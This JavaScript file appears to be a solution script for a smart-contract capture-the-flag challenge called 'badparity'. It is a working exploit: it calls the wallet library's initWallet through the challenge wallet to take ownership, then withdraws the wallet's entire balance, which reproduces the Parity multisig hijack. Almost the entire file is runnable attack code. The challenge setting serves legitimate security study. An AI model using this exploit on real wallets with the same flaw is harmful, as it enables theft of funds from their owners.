const fs = require("fs");

const Solution = require("../Solution");
const { BADPARITY_ADDR, BADPARITY_LIB_ADDR } = require("../../config/addresses");

class BadParitySolution extends Solution {
    constructor() {
        super(BADPARITY_ADDR);
    }

    async run() {
        await this.unlock();
        console.log("Running badparity solution...");
        await this.printBalances();
        try {
            console.log("Starting exploit");

            const challengeAbi = JSON.parse(fs.readFileSync("./challenges/badparity/Wallet.abi", "utf-8"));
            const challengeContract = new this.w3.eth.Contract(challengeAbi, this.challengeAddr);

            const walletLibAbi = JSON.parse(fs.readFileSync("./challenges/badparity/WalletLibrary.abi", "utf-8"));
            const walletLibAddr = this.w3.utils.toChecksumAddress(BADPARITY_LIB_ADDR);
            const walletLibContract = new this.w3.eth.Contract(walletLibAbi, walletLibAddr);

            const txObject = {
                from: this.myAddr,
                to: this.challengeAddr,
                data: walletLibContract.methods.initWallet(this.myAddr).encodeABI(),
            };

            const gas = await this.w3.eth.estimateGas(txObject);

            console.log("Changing owner");
            await this.w3.eth.sendTransaction({ ...txObject, gas });

            const walletBalance = await this.w3.eth.getBalance(this.challengeAddr);
            console.log("Withdrawing balance");
            await challengeContract.methods.withdraw(walletBalance).send({ from: this.myAddr });
            console.log("Done!");
        } catch (err) {
            console.error(err);
        }
        await this.printBalances();
    }
}

const sol = new BadParitySolution();
sol.run();
